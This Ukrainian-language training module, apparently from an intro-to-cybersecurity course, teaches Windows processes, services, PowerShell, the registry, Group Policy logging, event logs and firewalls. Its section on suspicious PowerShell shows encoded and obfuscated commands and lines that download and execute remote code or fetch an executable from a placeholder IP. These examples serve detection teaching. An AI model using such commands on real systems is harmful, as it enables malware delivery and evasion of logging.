## 1. Основи Windows OS
Операційна система (ОС) - це комплекс різних програм та їх компонентів, який керує апаратними та програмними ресурсами комп'ютера, а також надає можливість іншим програмам взаємодіяти з “залізом” компʼютера.

## 2. Налаштування
Налаштування - це графічна програма для базових налаштувань ОС, які даються звичайним користувачам. Всі просунуті налаштування робляться через термінал, powershell, або інші програми. 

## 3. Процеси
Програма - це компʼютерний код. Програми зазвичай зберігаються у виконуваних файлах типу .exe. Самі по собі програми не можуть запускатись і взаємодіяти з ОС, для цього їм потрібен ПРОЦЕС. Процес має виділену під нього частину оперативної памʼяті, саму програму (e.g., exe), ID процесу, thread (сутність, що стає у чергу на виконання обчислень процесором), та handle (сутність, що виступає логічною асоціацією з ресурсами, у нашому випадку з процесом).

### Виконайте завдання:
1. Відкрийте диспетчер задач (Task Manager).
2. Запустіть програму, наприклад, Google Chrome.
3. Спостерігайте, як створюється новий процес.
4. Перевірте PID (process ID) цього процесу, та PPID (parent process ID).

## 4. Здорове дерево процесів
![Дерево процесів](https://github.com/sarin00/Course1-Intro-to-Cybersecruity/blob/main/%D1%8F%D0%94%D0%BE%D0%B4%D0%B0%D1%82%D0%BA%D0%BE%D0%B2%D1%96%20%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D1%96%D0%B0%D0%BB%D0%B8/Win_proctree.png)

## 5. Сервіси
Процес - це екземпляр конкретного виконуваного файлу (.exe програмного файлу), що запущений. Сервіс - це процес, який працює в фоновому режимі та не взаємодіє графічно з користувачем. У Windows, сервіси зазвичай працюють як дочірні процеси svchost.exe, процесу-хосту служб Windows.

### Виконайте завдання:
1. Відкрийте меню "Пуск".
2. Введіть "Служби" або "Services" та оберіть "Служби" або "Services" з результатів пошуку. 
3. У вікні "Служби" ви побачите список різних служб, які наразі встановлені на вашій ОС.
Кожна служба матиме назву, опис, статус (працює, зупинено і т.д.) та тип запуску (автоматичний, ручний, відключено).
Ви можете натиснути правою кнопкою миші (далі по тексту ПКМ) на службу, щоб отримати більше інформації про неї, запустити / зупинити службу або змінити її налаштування.

## 6. CMD та PowerShell
Командний рядок (CMD) - це інструмент взаємодії з ОС та її компонентами через команди. Взаємодія з графічним інтерфейсом ОС потрібна звичайним користувачам, і велика кількість просунутих адміністративних функцій доступні тільки через CMD чи PowerShell. 
PowerShell - це інструмент для автоматизації адміністративних завдань, який складається з командного рядка, синтаксису PowerShell та його команд (командлетів). PowerShell працює на Windows, Linux та macOS.

### Виконайте завдання:
1. Основними командами є: cd, dir, cls, вони ж є однаковими для CMD та PowerShell. Спробуйте відкрити якусь папку через CMD та PowerShell. Звикніть просуватись по файловій системі через команди.
2. Запустіть Chrome через команду, спершу з помилкою, не використовуючи .\ перед exe-файлом - `C:\Program Files (x86)\Google\Chrome\Application\ .\chrome.exe`. Навчіться запускати програми через командну строку.
3. Запустити калькулятор, `calc`.
4. PowerShell використовує форму дія-сутність (Verb-Noun) для назви своїх командлетів. Наприклад, `Get-Command`.
5. `Get-ExecutionPolicy` - перевірити політику контролю виконання команд та скриптів.
6. `Set-ExecutionPolicy - ExecutionPolicy RemoteSigned`
7. `Get-Command` - переглянути всі доступні команди.
8. `Get-process` - переглянути запущені процеси
9. Фільтрування за ім'ям (taskmgr): `get-process -Name Taskmgr`
10. Фільтрування за ID: `get-process -Id <номер-процесу>`
11. Показати, що можна зробити з об'єктом - `Get-Member`
12. Фільтрування методів - `Get-Process | Get-Member -MemberType Method`
13. Використати метод kill() для процесу, спробувати знову знайти його за id чи іменем `(get-process -Id <id>).kill()`

Додаткова інформація: [Команди Powershell](https://learn.microsoft.com/en-us/powershell/scripting/powershell-commands?view=powershell-7.3)

## 7. Приклади шкідливих та підозрілих команд Powershell
1. Закодовані команди, містять в собі encoded, en, enc, та подібні параметри:
```
powershell.exe -encod VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==
```
2. Використання base64 для закодовування шкідливих команд:
```
Invoke-Expression -Command ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==')))
```
3. Використання спеціальних символів (^, +, $ та %) щоб розбити команду на текстові блоки і оминати примітивні правила детектування:
```
& ([ScriptBlock]::Create("Write-Host '$("{0}{1}{2}{2}{0}" -f 't','w','e'), $([Char] 116)$([Char] 119)$("$(([Char] 0x65))" * 2)t'"))`
```
4. Використання параметрів -nop, -noni. Команда виконується без інтерактивного вікна.
5. Використання invoke-expression чи iex щоб запустити команди, що завантажуються з віддаленого ресурсу
```
powershell.exe -nop iex "\"Write-Host `\"$((New-Object Net.WebClient).DownloadString('https://user.github.com/repo/blabla/badcode.txt'))`\"\""
```
6. Завантаження файлу з віддаленого ресурсу з downloadfile:
```
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```

[Більше інформації про шкідливе використання Powershell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

## 8. Реєстр
Реєстр Windows - це ієрархічна база даних, яка зберігає низькорівневі налаштування для операційної системи Windows і для програм що на ній встановлені. Ці налаштування складаються з Key та Value. Key є чимось типу “шляху” до якогось налаштування, що дуже нагадує структуру папок. Наприклад, ось ключ `“HKEY_CURRENT_USER\Control Panel\Desktop\Colors\”`. Value -  це безпосереднє налаштування, комбінація назви та значення. 
Hive - це логічна група ключів, підключів та значень в реєстрі. Ключі що стосуються однієї сутності (наприклад, користувача, програм, чи самої ОС) логічно обʼєднуються в один Hive. Наприклад, ключі користувачів знаходяться під Hive HKEY_USERS.

Різниця між hive, key(ключем), value(значенням) буде така:
Приклад - `HKEY_CURRENT_USER\Control Panel\Desktop\Colors\Menu`

HIVE: HKEY_CURRENT_USER
KEY: Control Panel
SUBKEY: Desktop
SUBKEY: Colors
VALUE: Menu

Типи Hive:
1. `HKEY_CLASSES_ROOT`. HKCR зберігає інформацію про зареєстровані програми
2. `HKEY_CURRENT_USER`. HKCU зберігає налаштування, які специфічні для поточного користувача який увійшов у систему. HKCU - це посилання на ключ всередині хайву HKEY_USERS; одна і та ж інформація відображається в обох хайвах.
3. `HKEY_LOCAL_MACHINE`. HKLM зберігає налаштування, які є загальними для всіх користувачів на комп'ютері.
4. `HKEY_CURRENT_CONFIG`. HKCC містить інформацію, зібрану під час роботи; Інформація що міститься в цьому хайві не зберігається на постійній основі, а генерується під час роботи ОС та видаляється при виключенні компʼютера.

### Виконайте завдання:
1. Відкрийте Registry Editor(Редактор реєстрів), покажіть всі hives(хайви) і поясніть за що відповідає кожен хайв.
2. Перемкніться на CLASSES_ROOT, натисніть на відомі формати, такі як .doc, .mp4, .ova. Перевірте які програми привʼязані до цих форматів. 
3. Перейдіть до CURRENT_USER, покажіть SOFTWARE subkey(підключ)
4. Перейдіть до налаштувань PowerShell - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell`

### Виконайте завдання:
1. Перевірте, які програми відкриваються при старті комп’ютера (автозапуск).
2. Перевірте для цього ці 2 ключі. Чому вони зберігаються у різних хайвах?
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`

## 9. Групові політики (Group Policy)
Групова політика (Group Policy) - це набір конфігурацій, які змінюють налаштування операційної системи. Такі конфігурації можна робити як для одного компʼютера (local group policy), так і для цілого домену через Active Directory Domain Services (AD DS) за допомогою Group Policy Management Console (GPMC).

### Виконайте завдання:
1. Включити логування команд, що виконуються у PowerShell (script block logging):
2. Відкрити редактор групових політик -> Computer configuration -> Administrative Templates: Policy Definitions -> Windows Components -> Windows PowerShell
3. ПКМ по "Turn on Module Logging", обрати Edit, поставити галку біля "Enabled"
4. Після галки біля enabled, з'явиться кнопка "Show" біля "Modules Names".
5. Натисніть на "Show"
6. Натисніть на "value" та впишіть "*", щоб логувати всі модулі PowerShell
7. Натисніть "OK", щоб закрити це вікно
8. Натисніть ПКМ на "Turn on PowerShell Script Block Logging" та оберіть "Edit"
9. Поставити галку біля "Enabled"
10. Опціонально можна поставити галку біля "log script invocation start/stop"
11. Натисніть "Apply" та "OK"

### Виконайте завдання:
Дізнайтесь, як налаштувати максимальний вік життя пароля різними інструментами. Підказки:
1. Перевірте реєстр 
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SeCEdit\Reg Values\MACHINE/System/CurrentControlSet/Services/Netlogon/Parameters/
```
3. Powershell net accounts
4. Групова політика

## 10. Логування та Журнал Подій
Найважливішими подіями є дані види: Security, System, Application. У кожної події є свій ID. Можете переглянути їх детальніше за [посиланням](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx?i=j)
Проте варто зазначити, що більшість логів є не дуже інформативними, і саме через їх велику кількість їх фільтрування здійснюється автоматизованими системами.

### Виконайте завдання:
1. Перегляньте PowerShell логи з ID 4103 та 4104, які могли створитись з попереднього запуску PowerShell після включення script block logging.
2. Логи, які можуть бути потенційно цікавими для Threat Hunting можна переглянути за [посиланням](https://www.activecountermeasures.com/hunting-windows-event-logs/)

## 11. Порти та Фаєрволи
Порт у мережевій технології - це числове значення, визначене програмно і пов'язане з мережевим протоколом, яке приймає або передає комунікацію для певної служби. Існує 65 535 можливих портів.

### Виконайте завдання:
1. Перевірте відкриті порти в CMD командою `netstat -ab`
2. Відкрийте Windows Defender Firewall
3. Дозвольте ICMP на вхід та перевірте мережеву доступність до цієї OS Windows командою `ping` з іншого компʼютера в одній мережі з Windows
4. Забороніть ICMP та повторіть `ping`

## 12. Task Scheduler
Аналогією крон задач для Windows є scheduled tasks, або заплановані задачі. Шкідливі програми можуть додавати запуск свого шкідливого коду як задачу, таким чином продовжуючи працювати навіть після перезапуску ОС.

## 13. Домашнє завдання
1. https://tryhackme.com/room/introtoendpointsecurity
2. https://tryhackme.com/room/windowsapi
3. Прочитайте про програми Sysinternals від Майкрософт
4. Прочитайте про Sysmon та його можливості

## 14. Додаткові матеріали
1. [Команди Powershell](https://learn.microsoft.com/en-us/powershell/scripting/powershell-commands?view=powershell-7.3)
2. [Більше інформації про шкідливе використання Powershell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
3. [Енциклопедія журналу подій](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx?i=j)  
4. [Логи, цікаві для Threat Hunting](https://www.activecountermeasures.com/hunting-windows-event-logs/)  
